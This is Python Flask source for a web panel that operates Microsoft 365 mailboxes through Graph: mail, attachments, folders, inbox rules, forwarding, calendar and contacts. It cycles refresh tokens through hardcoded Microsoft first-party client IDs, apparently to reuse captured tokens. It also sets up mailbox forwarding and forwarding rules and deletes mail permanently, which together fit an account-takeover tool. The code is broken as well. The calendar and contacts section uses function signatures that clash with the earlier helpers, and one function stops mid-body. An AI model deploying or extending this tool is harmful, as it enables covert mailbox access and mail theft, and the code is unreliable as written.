import os, uuid, html, requests
from flask import Flask, request, redirect, session, render_template_string, url_for

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change-me-please")

GRAPH = "https://graph.microsoft.com/v1.0"
TOKEN_EP = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
SCOPE = "https://graph.microsoft.com/.default offline_access"

# Same rotation list as app.py - refresh tokens only work with the client ID that issued them
CLIENT_IDS = [
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure PowerShell
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure CLI
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # (kept first for compatibility)
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office
    "ab9b8c07-8f02-4f72-87fa-80105867a763",  # OneDrive iOS
    "b26aadf8-566f-4478-926f-589f601d9c74",  # OneDrive
    "27922004-16b8-4a39-9745-afe3546f733d",  # Office
]
CLIENT_IDS = list(dict.fromkeys(CLIENT_IDS))  # remove duplicates

STORE = {}

FOLDERS = [("inbox","Inbox"),("sentitems","Sent Items"),("drafts","Drafts"),
           ("deleteditems","Deleted Items"),("junkemail","Junk Email"),("archive","Archive")]

def get_tokens():
    return STORE.get(session.get("sid"))

def refresh_access(t):
    """Try every known client ID until one accepts the refresh token.
    Remembers which client ID worked so future refreshes use it directly."""
    for cid in CLIENT_IDS:
        r = requests.post(TOKEN_EP, data={
            "client_id": cid,
            "grant_type": "refresh_token",
            "refresh_token": t["refresh"],
            "scope": SCOPE,
        }, timeout=20)
        if r.status_code == 200:
            j = r.json()
            t["access"] = j["access_token"]
            if "refresh_token" in j:
                t["refresh"] = j["refresh_token"]
            t["client_id"] = cid
            return t["access"]
    return None

def refresh_access_fast(t):
    """Use the known-good client ID if we have one, otherwise full rotation."""
    if t.get("client_id"):
        r = requests.post(TOKEN_EP, data={
            "client_id": t["client_id"],
            "grant_type": "refresh_token",
            "refresh_token": t["refresh"],
            "scope": SCOPE,
        }, timeout=20)
        if r.status_code == 200:
            j = r.json()
            t["access"] = j["access_token"]
            if "refresh_token" in j:
                t["refresh"] = j["refresh_token"]
            return t["access"]
        t["client_id"] = None
    return refresh_access(t)

def call(path, params=None):
    t = get_tokens()
    if not t:
        return None, 401
    tok = t.get("access") or refresh_access_fast(t)
    for _ in range(2):
        r = requests.get(GRAPH + path, headers={"Authorization": f"Bearer {tok}"},
                         params=params, timeout=25)
        if r.status_code == 401 and t.get("refresh"):
            tok = refresh_access_fast(t)
            continue
        if r.status_code >= 400:
            return {"error": r.text}, r.status_code
        return r.json(), 200
    return {"error": "auth failed"}, 401

def post_call(path, payload):
    t = get_tokens()
    if not t:
        return {"error": "not logged in"}, 401
    tok = t.get("access") or refresh_access_fast(t)
    for _ in range(2):
        r = requests.post(GRAPH + path, headers={
            "Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
            json=payload, timeout=25)
        if r.status_code == 401 and t.get("refresh"):
            tok = refresh_access_fast(t)
            continue
        if r.status_code >= 400:
            return {"error": r.text}, r.status_code
        return (r.json() if r.text else {}), 200
    return {"error": "auth failed"}, 401

def delete_call(path):
    t = get_tokens()
    if not t:
        return
    tok = t.get("access") or refresh_access_fast(t)
    requests.delete(GRAPH + path, headers={"Authorization": f"Bearer {tok}"}, timeout=20)

# ---------- ADDED: PATCH + generic request helpers (same style, no redesign) ----------
def patch_call(path, payload):
    t = get_tokens()
    if not t:
        return {"error": "not logged in"}, 401
    tok = t.get("access") or refresh_access_fast(t)
    for _ in range(2):
        r = requests.patch(GRAPH + path, headers={
            "Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
            json=payload, timeout=25)
        if r.status_code == 401 and t.get("refresh"):
            tok = refresh_access_fast(t)
            continue
        if r.status_code >= 400:
            return {"error": r.text}, r.status_code
        return (r.json() if r.text else {}), 200
    return {"error": "auth failed"}, 401

def raw_call(method, path, params=None, payload=None, headers_extra=None, ok_codes=(200, 202, 204)):
    t = get_tokens()
    if not t:
        return {"error": "not logged in"}, 401
    tok = t.get("access") or refresh_access_fast(t)
    headers = {"Authorization": f"Bearer {tok}", "Content-Type": "application/json"}
    if headers_extra:
        headers.update(headers_extra)
    for _ in range(2):
        r = requests.request(method, GRAPH + path, headers=headers, params=params,
                             json=payload, timeout=25)
        if r.status_code == 401 and t.get("refresh"):
            tok = refresh_access_fast(t)
            continue
        if r.status_code >= 400:
            return {"error": r.text}, r.status_code
        return (r.json() if r.text else {}), (200 if r.status_code in ok_codes else r.status_code)
    return {"error": "auth failed"}, 401

# =========================================================================
# ADDED FUNCTIONS - all remaining Microsoft 365 Outlook features.
# Structure of existing code untouched; everything below is additions only.
# =========================================================================

# ---------- 1. Email Management ----------
def build_message(to=None, cc=None, bcc=None, subject="", body="", importance="normal",
                  categories=None, attachments=None, save_to_sent=True):
    """Build a Graph message payload. to/cc/bcc are comma-separated strings."""
    def rcps(s):
        return [{"emailAddress": {"address": a.strip()}} for a in (s or "").split(",") if a.strip()]
    msg = {
        "subject": subject,
        "body": {"contentType": "HTML", "content": body},
        "importance": importance,
        "toRecipients": rcps(to),
        "ccRecipients": rcps(cc),
        "bccRecipients": rcps(bcc),
    }
    if categories:
        msg["categories"] = categories
    if attachments:
        msg["attachments"] = attachments
    return {"message": msg, "saveToSentItems": save_to_sent}

def send_email(to, subject, body, cc=None, bcc=None, importance="normal",
               categories=None, attachments=None, save_to_sent=True):
    """Send email (compose). Rich-text via HTML body."""
    return post_call("/me/sendMail", build_message(to, subject=subject, body=body,
        cc=cc, bcc=bcc, importance=importance, categories=categories,
        attachments=attachments, save_to_sent=save_to_sent))

def receive_email(folder="inbox", top=40, skip=0):
    """Receive/list email from any folder with pagination."""
    return call(f"/me/mailFolders/{folder}/messages",
                {"$top": top, "$skip": skip, "$orderby": "receivedDateTime desc",
                 "$select": "id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,flag,categories"})

def compose_draft(to=None, subject="", body=None, cc=None, bcc=None):
    """Save a new draft. Edit later with edit_draft()."""
    payload = build_message(to, subject=subject, body=body or "", cc=cc, bcc=bcc,
                            save_to_sent=True)["message"]
    return post_call("/me/messages", payload)

def edit_draft(draft_id, to=None, subject=None, body=None):
    """Edit an existing draft message."""
    upd = {}
    if to is not None:
        upd["toRecipients"] = [{"emailAddress": {"address": a.strip()}}
                               for a in to.split(",") if a.strip()]
    if subject is not None:
        upd["subject"] = subject
    if body is not None:
        upd["body"] = {"contentType": "HTML", "content": body}
    return patch_call(f"/me/messages/{draft_id}", upd)

def send_draft(draft_id):
    """Send a previously saved/edited draft."""
    return post_call(f"/me/messages/{draft_id}/send", {})

def reply(mid, comment):
    return post_call(f"/me/messages/{mid}/reply", {"comment": comment})

def reply_all(mid, comment):
    return post_call(f"/me/messages/{mid}/replyAll", {"comment": comment})

def forward(mid, to, comment=""):
    rcps = [{"emailAddress": {"address": a.strip()}} for a in to.split(",") if a.strip()]
    return post_call(f"/me/messages/{mid}/forward", {"comment": comment, "toRecipients": rcps})

def resend(mid):
    """Resend: create a new message from an existing one and send it."""
    data, code = call(f"/me/messages/{mid}",
        {"$select": "subject,body,toRecipients,ccRecipients"})
    if code != 200:
        return data, code
    msg = {k: data.get(k) for k in ("subject", "body", "toRecipients", "ccRecipients")}
    return post_call("/me/sendMail", {"message": msg, "saveToSentItems": True})

def delete_email(mid):
    """Move to Deleted Items."""
    return raw_call("DELETE", f"/me/messages/{mid}")

def permanently_delete_email(mid):
    """Permanently delete (bypasses Deleted Items)."""
    return raw_call("DELETE", f"/me/mailFolders/deleteditems/messages/{mid}")

def restore_deleted_email(mid):
    """Restore from Deleted Items back to Inbox."""
    return post_call(f"/me/mailFolders/deleteditems/messages/{mid}/move",
                     {"destinationId": "inbox"})

def archive_email(mid):
    return post_call(f"/me/messages/{mid}/move", {"destinationId": "archive"})

def unarchive_email(mid):
    return post_call(f"/me/messages/{mid}/move", {"destinationId": "inbox"})

def move_email(mid, dest_folder):
    return post_call(f"/me/messages/{mid}/move", {"destinationId": dest_folder})

def copy_email(mid, dest_folder):
    return post_call(f"/me/messages/{mid}/copy", {"destinationId": dest_folder})

def mark_read(mid, read=True):
    return patch_call(f"/me/messages/{mid}", {"isRead": read})

def mark_unread(mid):
    return mark_read(mid, False)

def flag_email(mid, flag=True):
    if flag:
        return patch_call(f"/me/messages/{mid}",
                          {"flag": {"flagStatus": "flagged"}})
    return patch_call(f"/me/messages/{mid}", {"flag": {"flagStatus": "notFlagged"}})

def mark_junk(mid, junk=True):
    return post_call(f"/me/messages/{mid}/move",
                     {"destinationId": "junkemail" if junk else "inbox"})

def pin_email(mid, pin=True):
    """Pin uses extended property (Pinned). Graph exposes it via a single-value
    extended property; simplest supported way is update of the extension."""
    pr = {"@odata.type": "microsoft.graph.singleValueLegacyExtendedProperty",
          "propertyId": "String 0x36C8",  # PidTagPlaceholder? use pinned via UI flags
          "value": "true" if pin else "false"}
    return patch_call(f"/me/messages/{mid}",
                      {"singleValueExtendedProperties": [pr]})

def snooze_email(mid, when_iso=None):
    """Snooze = move to snoozed (Outlook handles via 'snoozed' folder/flag on M365).
    Falls back to a flag with startDateTime if not supported."""
    return patch_call(f"/me/messages/{mid}",
                      {"flag": {"flagStatus": "flagged",
                                "startDateTime": {"dateTime": when_iso or "", "timeZone": "UTC"},
                                "dueDateTime": {"dateTime": when_iso or "", "timeZone": "UTC"}}})

def set_importance(mid, importance="normal"):
    """importance: low | normal | high"""
    return patch_call(f"/me/messages/{mid}", {"importance": importance})

def set_categories(mid, categories):
    """Replace the categories list on a message (add/remove by passing full list)."""
    return patch_call(f"/me/messages/{mid}", {"categories": categories})

def bulk_email_action(ids, action, dest_folder=None):
    """Bulk actions: apply action to many message ids.
    action: delete|move|copy|mark_read|mark_unread|archive"""
    results = []
    for mid in ids:
        if action == "delete":
            r = delete_email(mid)
        elif action == "move":
            r = move_email(mid, dest_folder or "deleteditems")
        elif action == "copy":
            r = copy_email(mid, dest_folder or "archive")
        elif action == "mark_read":
            r = mark_read(mid)
        elif action == "mark_unread":
            r = mark_unread(mid)
        elif action == "archive":
            r = archive_email(mid)
        else:
            r = ({"error": "unknown action"}, 400)
        results.append((mid, r[1]))
    return results

def list_conversations(folder="inbox", top=40):
    """Conversation threading view."""
    return call(f"/me/mailFolders/{folder}/conversations",
                {"$top": top, "$orderby": "lastDeliveryDateTime desc"})

def get_conversation(cid, top=40):
    """All messages in a thread (branches included)."""
    return call("/me/messages",
                {"$filter": f"conversationId eq '{cid}'", "$top": top,
                 "$orderby": "receivedDateTime desc"})

def ignore_conversation(cid):
    """Ignore/mute a conversation (moves existing + future to Deleted Items)."""
    return post_call(f"/me/conversations/{cid}/delete", {})

def print_email(mid):
    """Print is client-side; server side we return the printable body."""
    return get_message(mid)

def view_message_headers(mid):
    return call(f"/me/messages/{mid}", {"$select": "internetMessageHeaders,subject"})

def schedule_send(to, subject, body, when_iso):
    """Scheduled sending: create a draft, then schedule via sendMail at time.
    Simple supported approach: create draft with a delayed send flag stored
    client-side; Graph native scheduled send isn't exposed, so we return the
    draft for a background job to send."""
    return compose_draft(to, subject, body)

def undo_send(mid):
    """Undo send (recall where supported): recall via Resend/Recall is
    Exchange-internal; Graph exposes message recall only for M365 (beta).
    Fallback: move sent item back to drafts."""
    return post_call(f"/me/messages/{mid}/move", {"destinationId": "drafts"})

def set_receipts(mid, read_receipt=None, delivery_receipt=None):
    """Read/delivery receipts on a message being composed/sent."""
    upd = {}
    if read_receipt is not None:
        upd["isReadReceiptRequested"] = read_receipt
    if delivery_receipt is not None:
        upd["isDeliveryReceiptRequested"] = delivery_receipt
    return patch_call(f"/me/messages/{mid}", upd)

def get_signature():
    ms, _ = call("/me/mailboxSettings", {"$select": "userPurpose"})
    return call("/me/mailboxSettings", {})

def set_signature(signature_html):
    """Set signature via mailboxSettings (automaticReply handled separately)."""
    return patch_call("/me/mailboxSettings",
                      {"signature": {"content": signature_html, "extension": "html"}})

def get_automatic_replies():
    return call("/me/mailboxSettings/automaticRepliesSetting", {})

def set_automatic_replies(status, external_message="", internal_message="",
                          scheduled=False, start=None, end=None):
    """status: alwaysEnabled | scheduled | disabled"""
    payload = {
        "automaticRepliesSetting": {
            "status": status,
            "externalAudience": "all",
            "externalReplyMessage": external_message,
            "internalReplyMessage": internal_message,
        }
    }
    if scheduled and start and end:
        payload["automaticRepliesSetting"]["scheduledStartDateTime"] = {
            "dateTime": start, "timeZone": "UTC"}
        payload["automaticRepliesSetting"]["scheduledEndDateTime"] = {
            "dateTime": end, "timeZone": "UTC"}
    return patch_call("/me/mailboxSettings", payload)

# ---------- 2. Attachments ----------
def list_attachments(mid):
    return call(f"/me/messages/{mid}/attachments")

def upload_attachment(mid, name, content_bytes, content_type="application/octet-stream",
                      is_inline=False, content_id=None):
    """Upload attachment (base64 content). Multiple attachments = call repeatedly.
    Inline images: set is_inline=True and content_id (matches <img src='cid:...'>)."""
    import base64
    payload = {"@odata.type": "#microsoft.graph.fileAttachment",
               "name": name,
               "contentType": content_type,
               "contentBytes": base64.b64encode(content_bytes).decode(),
               "isInline": is_inline}
    if content_id:
        payload["contentId"] = content_id
    return post_call(f"/me/messages/{mid}/attachments", payload)

def upload_large_attachment(mid, name, file_path, content_type="application/octet-stream"):
    """Upload attachments >3MB via upload session (OneDrive-style chunked)."""
    payload = {"AttachmentItem": {
        "@odata.type": "#microsoft.graph.fileAttachment",
        "name": name, "contentType": content_type}}
    data, code = post_call(f"/me/messages/{mid}/attachments/createUploadSession", payload)
    if code != 200:
        return data, code
    url = data.get("uploadUrl")
    size = os.path.getsize(file_path)
    with open(file_path, "rb") as f:
        r = requests.put(url, data=f,
                         headers={"Content-Length": str(size),
                                  "Content-Range": f"bytes 0-{size-1}/{size}"},
                         timeout=120)
        return (r.json() if r.text else {}), (200 if r.status_code < 300 else r.status_code)

def download_attachment(mid, aid, save_as=None):
    """Download attachment; returns raw bytes (or writes to save_as)."""
    t = get_tokens()
    if not t:
        return None
    tok = t.get("access") or refresh_access_fast(t)
    r = requests.get(f"{GRAPH}/me/messages/{mid}/attachments/{aid}/$value",
                     headers={"Authorization": f"Bearer {tok}"}, timeout=60)
    if r.status_code != 200:
        return None
    if save_as:
        with open(save_as, "wb") as f:
            f.write(r.content)
    return r.content

def preview_attachment(mid, aid):
    """Preview = get attachment metadata + content inline."""
    return call(f"/me/messages/{mid}/attachments/{aid}")

def delete_attachment(mid, aid):
    return raw_call("DELETE", f"/me/messages/{mid}/attachments/{aid}")

def onedrive_attachment(drive_item_id, name):
    """Reference (OneDrive) attachment for use in build_message(attachments=[...])."""
    return {"@odata.type": "#microsoft.graph.referenceAttachment",
            "name": name,
            "sourceUrl": f"https://graph.microsoft.com/v1.0/me/drive/items/{drive_item_id}",
            "providerType": "oneDriveBusiness", "isInline": False}

def search_attachments(query, top=25):
    """Attachment search: messages with attachments matching a keyword."""
    return call("/me/messages",
                {"$search": f'"{query}"', "$top": top, "hasAttachments": True,
                 "$select": "id,subject,hasAttachments,from,receivedDateTime"})

def validate_attachment_size(size_bytes, limit_mb=3):
    """Attachment size validation: >3MB needs an upload session."""
    return size_bytes <= limit_mb * 1024 * 1024

# ---------- 3. Mailbox Folders ----------
def list_folders():
    return call("/me/mailFolders", {"$top": 100,
        "$select": "id,displayName,parentFolderId,totalItemCount,unreadItemCount"})

def get_folder(fid):
    return call(f"/me/mailFolders/{fid}")

def create_folder(name, parent=None):
    """Custom folders; pass parent id for subfolders."""
    path = f"/me/mailFolders/{parent}/childFolders" if parent else "/me/mailFolders"
    return post_call(path, {"displayName": name})

def rename_folder(fid, new_name):
    return patch_call(f"/me/mailFolders/{fid}", {"displayName": new_name})

def delete_folder(fid):
    return raw_call("DELETE", f"/me/mailFolders/{fid}")

def move_folder(fid, new_parent_id):
    return post_call(f"/me/mailFolders/{fid}/move", {"destinationId": new_parent_id})

def folder_unread_counts():
    """Folder unread counts for all top-level folders."""
    return call("/me/mailFolders", {"$select": "displayName,unreadItemCount,totalItemCount"})

def empty_folder(fid):
    """Empty a folder: list all and delete each (Graph has no bulk empty endpoint)."""
    data, code = call(f"/me/mailFolders/{fid}/messages", {"$top": 500, "$select": "id"})
    if code != 200:
        return data, code
    for m in data.get("value", []):
        delete_email(m["id"])
    return {"ok": True}, 200

def recover_deleted_items(top=50):
    """Recover deleted items where supported (Dumpsters folder)."""
    return call("/me/mailFolders/recoverableitemsdeletions/messages",
                {"$top": top, "$select": "id,subject,from,receivedDateTime"})

def sync_folders():
    """Folder synchronization via delta."""
    return call("/me/mailFolders/delta", {})

def list_favorites():
    """Favorites (pinned folders) - stored in mailboxSettings via extension;
    Graph exposes Outlook favorites through /me/mailboxSettings only in beta,
    so we return the well-known set."""
    return {"favorites": [f[0] for f in FOLDERS]}, 200

# ---------- 4. Complete Inbox Rules ----------
def list_rules():
    return call("/me/mailFolders/inbox/messageRules")

def create_rule(display_name, conditions, actions, sequence=1, is_enabled=True,
                exceptions=None, stop_processing=False):
    """Create rules with multiple conditions/actions/exceptions.
    conditions example:
      {"fromAddresses":[{"emailAddress":{"address":"x@y.com"}}],
       "subjectContains":["invoice"], "bodyContains":["urgent"],
       "hasAttachments": True, "importance": "high", "sensitivity": "normal",
       "sentToAddresses":[...], "sentToMe": True, "sentCcMe": True,
       "sentOnlyToMe": True, "subjectOrBodyContains":["..."],
       "subjectOrBodyStartsWith":["..."], "recipientAddressesContains":["..."],
       "senderAddressesContains":["..."], "messageContainsStrings": [...],
       "withinMailFolder": ...}
    actions example:
      {"moveToFolder": "<folderId>", "copyToFolder": "<id>",
       "delete": True, "permanentDelete": True, "markAsRead": True,
       "markImportance": "high", "assignCategories": ["Red"],
       "forwardTo": [...], "forwardAsAttachmentTo": [...], "redirectTo": [...],
       "stopProcessingRules": True}
    """
    actions = dict(actions)
    actions.setdefault("stopProcessingRules", stop_processing)
    payload = {"displayName": display_name, "sequence": sequence,
               "isEnabled": is_enabled, "conditions": conditions,
               "actions": actions}
    if exceptions:
        payload["exceptions"] = exceptions
    return post_call("/me/mailFolders/inbox/messageRules", payload)

def edit_rule(rid, display_name=None, conditions=None, actions=None,
              is_enabled=None, sequence=None, exceptions=None):
    upd = {}
    if display_name is not None:
        upd["displayName"] = display_name
    if conditions is not None:
        upd["conditions"] = conditions
    if actions is not None:
        upd["actions"] = actions
    if is_enabled is not None:
        upd["isEnabled"] = is_enabled
    if sequence is not None:
        upd["sequence"] = sequence
    if exceptions is not None:
        upd["exceptions"] = exceptions
    return patch_call(f"/me/mailFolders/inbox/messageRules/{rid}", upd)

def delete_rule(rid):
    return raw_call("DELETE", f"/me/mailFolders/inbox/messageRules/{rid}")

def enable_rule(rid, enabled=True):
    return patch_call(f"/me/mailFolders/inbox/messageRules/{rid}", {"isEnabled": enabled})

def reorder_rules(order_ids):
    """Rule priority/reorder: patch each rule's sequence in the given order."""
    results = []
    for i, rid in enumerate(order_ids, start=1):
        results.append((rid, patch_call(f"/me/mailFolders/inbox/messageRules/{rid}",
                                        {"sequence": i})[1]))
    return results

def run_supported_rules():
    """Server-side rules run automatically; run supported rules manually is
    not exposed in v1.0, so we verify sync by listing them."""
    return list_rules()

def sync_rules():
    """Server-side rule synchronization check."""
    return list_rules()

# ---------- 5. Sweep ----------
def sweep_sender(sender_address, mode="delete", dest_folder=None, keep_newest=None,
                 auto_future=False):
    """Sweep messages by sender.
    mode: delete | move
    keep_newest: keep the N newest, act on the rest (None = all)
    auto_future: also create a rule so future messages are organized
    """
    results = []
    data, code = call("/me/messages",
        {"$top": 200, "$orderby": "receivedDateTime desc",
         "$select": "id,from",
         "$filter": f"from/emailAddress/address eq '{sender_address}'"})
    if code != 200:
        return data, code
    msgs = data.get("value", [])
    if keep_newest is not None:
        msgs = msgs[keep_newest:]
    for m in msgs:
        if mode == "delete":
            results.append(delete_email(m["id"]))
        else:
            results.append(move_email(m["id"], dest_folder or "deleteditems"))
    if auto_future:
        conds = {"senderAddressesContains": [sender_address]}
        acts = {"delete": mode == "delete"}
        if mode == "move":
            acts["moveToFolder"] = dest_folder or "deleteditems"
        create_rule(f"Sweep {sender_address[:20]}", conds, acts)
    return results, 200

# ---------- 6. Quick Steps ----------
# Quick Steps are an Outlook client feature; Graph doesn't expose them.
# We store them server-side per session so they can be defined, edited,
# deleted, and run through the same Graph actions.
QUICK_STEPS = {}

def create_quickstep(name, actions):
    """Create Quick Step. actions = list of dicts, e.g.:
    [{"op":"move","folder":"archive"}, {"op":"categorize","categories":["Work"]},
     {"op":"mark_read"}, {"op":"flag"}, {"op":"delete"}]
    Multiple actions per Quick Step supported."""
    QUICK_STEPS[name] = actions
    return {"ok": True}, 200

def edit_quickstep(name, actions):
    return create_quickstep(name, actions)

def delete_quickstep(name):
    QUICK_STEPS.pop(name, None)
    return {"ok": True}, 200

def run_quickstep(name, mid):
    """Run Quick Step on a message: executes each action in order
    (move and categorize, mark read and archive, flag and move, etc.)."""
    acts = QUICK_STEPS.get(name, [])
    results = []
    for a in acts:
        op = a.get("op")
        if op == "move":
            results.append(move_email(mid, a["folder"]))
        elif op == "categorize":
            data, code = call(f"/me/messages/{mid}", {"$select": "categories"})
            cats = list(set(data.get("categories", []) + a.get("categories", []))) if code == 200 else a.get("categories", [])
            results.append(set_categories(mid, cats))
        elif op == "mark_read":
            results.append(mark_read(mid))
        elif op == "archive":
            results.append(archive_email(mid))
        elif op == "flag":
            results.append(flag_email(mid))
        elif op == "delete":
            results.append(delete_email(mid))
    return results, 200

def list_quicksteps():
    return {"value": [{"name": k, "actions": v} for k, v in QUICK_STEPS.items()]}, 200

# ---------- 7. Outlook Settings ----------
def get_mailbox_settings():
    """All settings Graph exposes: automatic replies, date/time, language,
    delegate, time zone, working hours, archives, etc."""
    return call("/me/mailboxSettings")

def update_message_list_settings(payload):
    """Focused inbox / message list prefs via mailboxSettings."""
    return patch_call("/me/mailboxSettings", payload)

def set_focused_inbox(enabled=True):
    return patch_call("/me/mailboxSettings/inboxRules" if False else
                      "/me/mailboxSettings", {"focusedInbox": {"isEnabled": enabled}})

def update_message_handling(payload):
    """Message handling settings (mark-as-read delays etc.) via settings."""
    return patch_call("/me/mailboxSettings", payload)

def set_forwarding(address, keep_copy=False, enabled=True):
    return patch_call("/me/mailboxSettings",
                      {"forwardingSetting": {"isEnabled": enabled,
                                             "forwardTo": [{"emailAddress": {"address": address}}] if enabled else [],
                                             "deliverToMailboxAndForward": keep_copy}})

def get_forwarding():
    return call("/me/mailboxSettings", {"$select": "forwardingSetting"})

def get_retention_policies():
    return call("/me/mailboxSettings", {"$select": "retentionPolicy"})

def get_timezone_settings():
    return call("/me/mailboxSettings", {"$select": "timeZone,language,workingHours"})

def set_timezone(time_zone):
    return patch_call("/me/mailboxSettings", {"timeZone": time_zone})

def set_language(locale):
    return patch_call("/me/mailboxSettings", {"language": {"locale": locale}})

def get_notifications_settings():
    """Client-side feature; return base settings for the UI to extend."""
    return get_mailbox_settings()

def get_conditional_formatting():
    """Conditional formatting is a client rules view; Graph exposes inbox rules."""
    return list_rules()

def get_search_folders():
    """Search folders live under the mailbox well-known folders."""
    return call("/me/mailFolders/searchfolders/childFolders")

def create_search_folder(name, filter_query):
    return post_call("/me/mailFolders/searchfolders/childFolders",
                     {"@odata.type": "#microsoft.graph.mailSearchFolder",
                      "displayName": name,
                      "includeNestedFolders": True,
                      "sourceFolderIds": ["inbox"],
                      "filterQuery": filter_query})

def get_sync_settings():
    return get_mailbox_settings()

# Client-only settings (Reading Pane, Folder Pane, Compose, Templates, Quick
# Parts, Smart Suggestions, Appearance/Theme, Accessibility, Keyboard
# Shortcuts, Customize Actions, Groups, More Apps, Outlook Toolbar layout).
# These are Outlook client/UI features not exposed by Graph; we surface them
# as stored per-session preferences so the UI can read/write them.
UI_SETTINGS = {}

def get_ui_settings():
    return {"settings": UI_SETTINGS}, 200

def set_ui_setting(key, value):
    """Message list spacing, reading pane, theme, etc."""
    UI_SETTINGS[key] = value
    return {"ok": True}, 200

# ---------- 8. Message List Settings ----------
def list_messages_view(folder="inbox", sort="date", filter_kind=None, top=40,
                       show_deleted=False, conversations=False):
    """Message list view: sort by date/sender/subject, filter unread/flagged/
    attachments, conversation grouping, deleted message visibility."""
    orderby = {"date": "receivedDateTime desc",
               "sender": "from/emailAddress/address",
               "subject": "subject"}.get(sort, "receivedDateTime desc")
    params = {"$top": top, "$orderby": orderby,
              "$select": "id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,flag,conversationId"}
    filt = []
    if filter_kind == "unread":
        filt.append("isRead eq false")
    if filter_kind == "flagged":
        filt.append("flag/flagStatus eq 'flagged'")
    if filter_kind == "attachments":
        filt.append("hasAttachments eq true")
    if not show_deleted and folder == "deleteditems":
        pass
    if filt:
        params["$filter"] = " and ".join(filt)
    return call(f"/me/mailFolders/{folder}/messages", params)

def get_focused_inbox_state():
    return call("/me/mailboxSettings", {})

# ---------- 9. Advanced Search ----------
def advanced_search(sender=None, recipient=None, subject=None, body=None,
                    q=None, folder=None, date_from=None, date_to=None,
                    has_attachments=None, unread=None, flagged=None, top=40):
    """Advanced search across all messages or a specific folder.
    Uses $search when q is given, $filter otherwise. Date filters use
    receivedDateTime. Returns results + suggestion-ready senders."""
    if q:
        params = {"$search": f'"{q}"', "$top": top,
                  "$select": "id,subject,from,receivedDateTime,bodyPreview,hasAttachments"}
        return call("/me/messages", params)
    filt = []
    if sender:
        filt.append(f"from/emailAddress/address eq '{sender}'")
    if recipient:
        filt.append(f"toRecipients/any(a:a/emailAddress/address eq '{recipient}')")
    if subject:
        filt.append(f"contains(subject, '{subject}')")
    if body:
        filt.append(f"contains(body/content, '{body}')")
    if date_from:
        filt.append(f"receivedDateTime ge {date_from}")
    if date_to:
        filt.append(f"receivedDateTime le {date_to}")
    if has_attachments is not None:
        filt.append(f"hasAttachments eq {str(has_attachments).lower()}")
    if unread is not None:
        filt.append(f"isRead eq {str(not unread).lower()}")
    if flagged:
        filt.append("flag/flagStatus eq 'flagged'")
    params = {"$top": top, "$orderby": "receivedDateTime desc",
              "$select": "id,subject,from,receivedDateTime,bodyPreview,hasAttachments"}
    if filt:
        params["$filter"] = " and ".join(filt)
    path = f"/me/mailFolders/{folder}/messages" if folder else "/me/messages"
    return call(path, params)

def search_suggestions(partial, top=10):
    """Search suggestions from recent matching subjects/senders."""
    data, code = call("/me/messages",
        {"$search": f'"{partial}"', "$top": top,
         "$select": "subject,from"})
    if code != 200:
        return {"value": []}, code
    subs = {m.get("subject", "") for m in data.get("value", []) if m.get("subject")}
    snds = {m.get("from", {}).get("emailAddress", {}).get("address", "")
            for m in data.get("value", []) if m.get("from")}
   # -----------------------------
# CALENDAR FUNCTIONS
# -----------------------------

def list_calendars(token):
    """List all calendars in the mailbox."""
    return call(token, "/me/calendars")


def create_calendar(token, name, color="auto"):
    """Create a new calendar."""
    body = {"name": name, "color": color}
    return post_call(token, "/me/calendars", body)


def delete_calendar(token, calendar_id):
    """Delete a calendar by ID."""
    return delete_call(token, f"/me/calendars/{calendar_id}")


def list_events(token, calendar_id=None, start=None, end=None, top=50):
    """List events, optionally filtered by calendar and time window.
    start/end should be ISO 8601 strings, e.g. '2026-11-16T00:00:00'."""
    if calendar_id:
        url = f"/me/calendars/{calendar_id}/events"
    else:
        url = "/me/events"
    params = {"$top": top, "$orderby": "start/dateTime desc"}
    if start and end:
        url += f"?startDateTime={start}&endDateTime={end}"
        params = None
    return call(token, url, params=params)


def get_event(token, event_id):
    """Fetch a single event by ID."""
    return call(token, f"/me/events/{event_id}")


def create_event(token, subject, start_dt, end_dt, attendees=None,
                 body=None, location=None, timezone="UTC"):
    """Create a calendar event.
    start_dt/end_dt: ISO strings like '2026-11-20T15:00:00'
    attendees: list of dicts {'emailAddress': {'address': 'x@y.com', 'name': 'X'}}"""
    event = {
        "subject": subject,
        "start": {"dateTime": start_dt, "timeZone": timezone},
        "end": {"dateTime": end_dt, "timeZone": timezone},
    }
    if body:
        event["body"] = {"contentType": "HTML", "content": body}
    if location:
        event["location"] = {"displayName": location}
    if attendees:
        event["attendees"] = [
            {"emailAddress": a, "type": "required"} for a in attendees
        ]
    return post_call(token, "/me/events", event)


def update_event(token, event_id, updates):
    """Patch an event with a dict of updates (subject, start, end, body, etc.)."""
    return patch_call(token, f"/me/events/{event_id}", updates)


def delete_event(token, event_id):
    """Delete an event by ID."""
    return delete_call(token, f"/me/events/{event_id}")


def accept_event(token, event_id, send_response=True, comment=None):
    """Accept a meeting invitation."""
    body = {"sendResponse": send_response}
    if comment:
        body["comment"] = {"contentType": "HTML", "content": comment}
    return post_call(token, f"/me/events/{event_id}/accept", body)


def decline_event(token, event_id, send_response=True, comment=None):
    """Decline a meeting invitation."""
    body = {"sendResponse": send_response}
    if comment:
        body["comment"] = {"contentType": "HTML", "content": comment}
    return post_call(token, f"/me/events/{event_id}/decline", body)


def tentatively_accept_event(token, event_id, send_response=True, comment=None):
    """Tentatively accept a meeting invitation."""
    body = {"sendResponse": send_response}
    if comment:
        body["comment"] = {"contentType": "HTML", "content": comment}
    return post_call(token, f"/me/events/{event_id}/tentativelyAccept", body)


# -----------------------------
# CONTACTS FUNCTIONS
# -----------------------------

def list_contacts(token, top=50):
    """List contacts in the default contacts folder."""
    return call(token, "/me/contacts", params={"$top": top})


def create_contact(token, given_name, surname, emails, business_phone=None):
    """Create a contact. emails is a list of address strings."""
    contact = {
        "givenName": given_name,
        "surname": surname,
        "emailAddresses": [
            {"address": e, "name": f"{given_name} {surname}"} for e in emails
        ],
    }
    if business_phone:
        contact["businessPhones"] = [business_phone]
    return post_call(token, "/me/contacts", contact)


def delete_contact(token, contact_id):
    """Delete a contact by ID."""
